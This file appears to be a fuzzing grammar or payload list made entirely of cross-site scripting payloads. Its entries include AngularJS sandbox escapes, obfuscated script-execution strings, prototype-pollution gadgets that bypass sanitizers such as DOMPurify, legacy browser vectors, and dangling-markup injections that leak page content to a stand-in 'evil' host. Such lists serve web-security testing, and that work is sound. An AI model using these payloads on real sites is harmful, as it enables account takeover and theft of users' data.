+<xss_payload> = {{!ready && (ready = true) && (!call? $$watchers[0].get(toString.constructor.prototype): (a = apply) &&(apply = constructor) &&(valueOf = call) &&(''+''.toString('F = Function.prototype;' +'F.apply = F.a;' +'delete F.a;' +'delete F.valueOf;' +'alert(1);')));}}
+<xss_payload> = {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
+<xss_payload> = {{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}
+<xss_payload> = {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+<xss_payload> = {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+<xss_payload> = {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
+<xss_payload> = {{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}
+<xss_payload> = {{constructor.constructor('alert(1)')()}}
+<xss_payload> = {{$on.constructor('alert(1)')()}}
+<xss_payload> = constructor.constructor('alert(1)')()
+<xss_payload> = a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()
+<xss_payload> = toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)
+<xss_payload> = {}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()
+<xss_payload> = {}.")));alert(1)//";
+<xss_payload> = 'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';
+<xss_payload> = constructor.constructor('alert(1)')()
+<xss_payload> = toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+<xss_payload> = <lt>input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'"<gt>
+<xss_payload> = <lt>input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)'<gt>
+<xss_payload> = <lt>input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"<gt>
+<xss_payload> = <lt>div ng-app ng-csp<gt><lt>div ng-focus="x=$event;" id=f tabindex=0<gt>foo<lt>/div<gt><lt>div ng-repeat="(key, value) in x.view"<gt><lt>div ng-if="key == 'window'"<gt>{{ [1].reduce(value.alert, 1); }}<lt>/div<gt><lt>/div<gt><lt>/div<gt>
+<xss_payload> = <lt>input ng-cut=$event.path|orderBy:'(y=alert)(1)'<gt>
+<xss_payload> = <lt>body background="//evil?<lt>table background="//evil?<lt>table<gt><lt>thead background="//evil?<lt>table<gt><lt>tbody background="//evil?<lt>table<gt><lt>tfoot background="//evil?<lt>table<gt><lt>td background="//evil?<lt>table<gt><lt>th background="//evil?
+<xss_payload> = <lt>link rel=stylesheet href="//evil?
+<xss_payload> = <lt>link rel=icon href="//evil?
+<xss_payload> = <lt>meta http-equiv="refresh" content="0; http://evil?
+<xss_payload> = <lt>img src="//evil?<lt>image src="//evil?
+<xss_payload> = <lt>video<gt><lt>track default src="//evil?
+<xss_payload> = <lt>video<gt><lt>source src="//evil?
+<xss_payload> = <lt>audio<gt><lt>source src="//evil?
+<xss_payload> = <lt>input type=image src="//evil?
+<xss_payload> = <lt>form<gt><lt>button style="width:100%;height:100%" type=submit formaction="//evil?
+<xss_payload> = <lt>form<gt><lt>input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?
+<xss_payload> = <lt>button form=x style="width:100%;height:100%;"<gt><lt>form id=x action="//evil?
+<xss_payload> = <lt>object data="//evil?
+<xss_payload> = <lt>iframe src="//evil?
+<xss_payload> = <lt>embed src="//evil?
+<xss_payload> = <lt>form<gt><lt>button formaction=//evil<gt>XSS<lt>/button<gt><lt>textarea name=x<gt>
+<xss_payload> = <lt>button form=x<gt>XSS<lt>/button<gt><lt>form id=x action=//evil target='
+<xss_payload> = <lt>a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html<gt><lt>font size=100 color=red<gt>You must click me<lt>/font<gt><lt>/a<gt><lt>base target="
+<xss_payload> = <lt>form<gt><lt>input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="
+<xss_payload> = <lt>a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;"<gt>xss<lt>base href="//evil/
+<xss_payload> = <lt>embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<xss_payload> = <lt>iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<xss_payload> = <lt>object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<xss_payload> = <lt>frameset<gt><lt>frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<xss_payload> = <lt>input type=hidden type=image src="//evil?
+<xss_payload> = javascript:/*--<gt><lt>/title<gt><lt>/style<gt><lt>/textarea<gt><lt>/script<gt><lt>/xmp<gt><lt>svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'<gt>
+<xss_payload> = javascript:"/*'/*`/*--<gt><lt>/noscript<gt><lt>/title<gt><lt>/textarea<gt><lt>/style<gt><lt>/template<gt><lt>/noembed<gt><lt>/script<gt><lt>html \" onmouseover=/*&lt;svg/*/onload=alert()//<gt>
+<xss_payload> = javascript:/*--<gt><lt>/title<gt><lt>/style<gt><lt>/textarea<gt><lt>/script<gt><lt>/xmp<gt><lt>details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'<gt>
+<xss_payload> = ';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
+<xss_payload> = ';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//
+<xss_payload> = ';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//
+<xss_payload> = ';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//
+<xss_payload> = ';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//
+<xss_payload> = ';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//
+<xss_payload> = ';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
+<xss_payload> = ';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//
+<xss_payload> = ';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//
+<xss_payload> = ';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//
+<xss_payload> = ';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//
+<xss_payload> = ';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//
+<xss_payload> = ';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//
+<xss_payload> = ';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//
+<xss_payload> = ';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+<xss_payload> = ';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+<xss_payload> = ';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+<xss_payload> = ';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+<xss_payload> = ';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+<xss_payload> = ';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+<xss_payload> = ';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+<xss_payload> = ';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//
+<xss_payload> = ';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');//
+<xss_payload> = ';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');//
+<xss_payload> = ';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');//
+<xss_payload> = ';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');//
+<xss_payload> = ';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');//
+<xss_payload> = ';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');//
+<xss_payload> = ';window['\141\154\145\162\164']('\130\123\123');//
+<xss_payload> = ';self['\141\154\145\162\164']('\130\123\123');//
+<xss_payload> = ';this['\141\154\145\162\164']('\130\123\123');//
+<xss_payload> = ';top['\141\154\145\162\164']('\130\123\123');//
+<xss_payload> = ';parent['\141\154\145\162\164']('\130\123\123');//
+<xss_payload> = ';frames['\141\154\145\162\164']('\130\123\123');//
+<xss_payload> = ';globalThis['\141\154\145\162\164']('\130\123\123');//
+<xss_payload> = ';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+<xss_payload> = ';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+<xss_payload> = ';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+<xss_payload> = ';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+<xss_payload> = ';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+<xss_payload> = ';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+<xss_payload> = ';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+<xss_payload> = ';window[/al/.source+/ert/.source](/XSS/.source);//
+<xss_payload> = ';self[/al/.source+/ert/.source](/XSS/.source);//
+<xss_payload> = ';this[/al/.source+/ert/.source](/XSS/.source);//
+<xss_payload> = ';top[/al/.source+/ert/.source](/XSS/.source);//
+<xss_payload> = ';parent[/al/.source+/ert/.source](/XSS/.source);//
+<xss_payload> = ';frames[/al/.source+/ert/.source](/XSS/.source);//
+<xss_payload> = ';globalThis[/al/.source+/ert/.source](/XSS/.source);//
+<xss_payload> = ';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+<xss_payload> = ';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+<xss_payload> = ';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+<xss_payload> = ';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+<xss_payload> = ';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+<xss_payload> = ';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+<xss_payload> = ';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+<xss_payload> = <lt>script<gt>Object.prototype.innerHTML = '<lt>img/src/onerror=alert(1)<gt>';<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.preventDefault='x';Object.prototype.handleObj='x';Object.prototype.delegateTarget='<lt>img/src/onerror=alert(1)<gt>';/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.div=['1','<lt>img src onerror=alert(1)<gt>','1']<lt>/script<gt><lt>script<gt>$('<lt>div x="x"<gt><lt>/div<gt>')<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.url = ['data:,alert(1)//'];Object.prototype.dataType = 'script';<lt>/script<gt><lt>script<gt>$.get('https://google.com/');$.post('https://google.com/');<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.src = ['data:,alert(1)//']<lt>/script<gt><lt>script<gt>$.getScript('https://google.com/')<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.url = 'data:,alert(1)//'<lt>/script<gt><lt>script<gt>$.getScript('https://google.com/')<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.srcdoc=['<lt>script<gt>alert(1)<lt>\/script<gt>']<lt>/script<gt><lt>div class="g-recaptcha" data-sitekey="your-site-key"/<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.hif = ['javascript:alert(document.domain)'];<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.attrs = {src:1};Object.prototype.src='https://portswigger-labs.net/xss/xss.js'<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.sourceURL = '\u2028\u2029alert(1)'<lt>/script<gt><lt>script<gt>_.template('test')<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype['*'] = ['onload']<lt>/script<gt><lt>script<gt>document.write(sanitizeHtml('<lt>iframe onload=alert(1)<gt>'))<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.whiteList = {img: ['onerror', 'src']}<lt>/script<gt><lt>script<gt>document.write(filterXSS('<lt>img src onerror=alert(1)<gt>'))<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.ALLOWED_ATTR = ['onerror', 'src']<lt>/script<gt><lt>script<gt>document.write(DOMPurify.sanitize('<lt>img src onerror=alert(1)<gt>'))<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.documentMode = 9<lt>/script<gt>
+<xss_payload> = <lt>script<gt>const html = '<lt>img src onerror=alert(1)<gt>';const sanitizer = new goog.html.sanitizer.HtmlSanitizer();const sanitized = sanitizer.sanitize(html);const node = goog.dom.safeHtmlToNode(sanitized);document.body.append(node);<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.tagName = 'img'Object.prototype.src = ['x:x']Object.prototype.onerror = ['alert(1)']<lt>/script<gt><lt>script<gt>(function() {var View = Mn.View.extend({template: '#template-layout'});var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});var app = new App();app.start();})();<lt>/script<gt><lt>div id="template-layout" type="x-template/underscore"<gt>xxx<lt>/div<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.src='data:,alert(1)//'<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.onload = 'alert(1)'<lt>/script<gt>
+<xss_payload> = <lt>script<gt>Object.prototype.script = [1,'<lt>img/src/onerror=alert(1)<gt>','<lt>img/src/onerror=alert(2)<gt>']<lt>/script<gt>
+<xss_payload> = <lt>strong data-bind="text:'hello'"<gt><lt>/strong<gt><lt>script<gt>Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=',';<lt>/script<gt><lt>script<gt>ko.applyBindings({})<lt>/script<gt>
+<xss_payload> = <lt>img src="javascript:alert(1)"<gt>
+<xss_payload> = <lt>body background="javascript:alert(1)"<gt>
+<xss_payload> = <lt>iframe src="data:text/html,<lt>img src=1 onerror=alert(document.domain)<gt>"<gt>
+<xss_payload> = <lt>a href="vbscript:MsgBox+1"<gt>XSS<lt>/a<gt><lt>a href="#" onclick="vbs:Msgbox+1"<gt>XSS<lt>/a<gt><lt>a href="#" onclick="VBS:Msgbox+1"<gt>XSS<lt>/a<gt><lt>a href="#" onclick="vbscript:Msgbox+1"<gt>XSS<lt>/a<gt><lt>a href="#" onclick="VBSCRIPT:Msgbox+1"<gt>XSS<lt>/a<gt><lt>a href="#" language=vbs onclick="vbscript:Msgbox+1"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>a href="#" onclick="jscript.compact:alert(1);"<gt>test<lt>/a<gt><lt>a href="#" onclick="JSCRIPT.COMPACT:alert(1);"<gt>test<lt>/a<gt>
+<xss_payload> = <lt>a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"<gt>XSS<lt>/a<gt><lt>a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@<gt><lt>iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@<gt>
+<xss_payload> = <lt>a title="&{alert(1)}"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>link href="xss.js" rel=stylesheet type="text/javascript"<gt>
+<xss_payload> = <lt>form<gt><lt>button name=x formaction=x<gt><lt>b<gt>stealme
+<xss_payload> = <lt>form action=x<gt><lt>button<gt>XSS<lt>/button<gt><lt>select name=x<gt><lt>option<gt><lt>plaintext<gt><lt>script<gt>token="supersecret"<lt>/script<gt>
+<xss_payload> = <lt>div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"<gt><lt>div style="\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"<gt><lt>div style="-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"<gt><lt>div style="-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"<gt>
+<xss_payload> = <lt>img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" /<gt>
+<xss_payload> = <lt>div style=xss:expression(alert(1))<gt><lt>div style=xss:expression(1)-alert(1)<gt><lt>div style=xss:expressio\6e(alert(1))<gt><lt>div style=xss:expressio\006e(alert(1))<gt><lt>div style=xss:expressio\00006e(alert(1))<gt><lt>div style=xss:expressio\6e(alert(1))<gt><lt>div style=xss:expressio&#x5c;6e(alert(1))<gt>
+<xss_payload> = <lt>div style=xss=expression(alert(1))<gt><lt>div style="color&#x3dred"<gt>test<lt>/div<gt>
+<xss_payload> = <lt>a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)"<gt>XSS<lt>/a<gt>
+<xss_payload> = <lt>script<gt>function window.onload(){alert(1);}<lt>/script<gt><lt>script<gt>function window::onload(){alert(1);}<lt>/script<gt><lt>script<gt>function window.location(){}<lt>/script<gt><lt>body<gt><lt>script<gt>function/*<lt>img src=1 onerror=alert(1)<gt>*/document.body.innerHTML(){}<lt>/script<gt><lt>/body<gt><lt>body<gt><lt>script<gt>function document.body.innerHTML(){ x = "<lt>img src=1 onerror=alert(1)<gt>"; }<lt>/script<gt><lt>/body<gt>
+<xss_payload> = <lt>HTML<gt><lt>BODY<gt><lt>?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"<gt><lt>?import namespace="t" implementation="#default#time2"<gt><lt>t:set attributeName="innerHTML" to="XSS<lt>img src=1 onerror=alert(1)<gt>"<gt> <lt>/BODY<gt><lt>/HTML<gt>
+<xss_payload> = <lt>a href="javascript& #x6a;avascript:alert(1)"<gt>Firefox<lt>/a<gt>
+<xss_payload> = <lt>a href="javascript& colon ;alert(1)"<gt>Firefox<lt>/a<gt>
+<xss_payload> = <lt>!- - <gt><lt>img title="--<gt><lt>iframe/onload=alert(1)<gt>"<gt> --<gt><lt>!-     - <gt><lt>img title="--<gt><lt>iframe/onload=alert(1)<gt>"<gt> --<gt>
+<xss_payload> = <lt>svg<gt><lt>xss onload=alert(1)<gt>
+<xss_payload> = <lt>isindex type=image src="//evil?
+<xss_payload> = <lt>isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?
+<xss_payload> = <lt>isindex type=submit formaction=javascript:alert(1)<gt>
+<xss_payload> = <lt>isindex type=submit action=javascript:alert(1)<gt>
+<xss_payload> = <lt>svg<gt><lt>discard onbegin=alert(1)<gt>
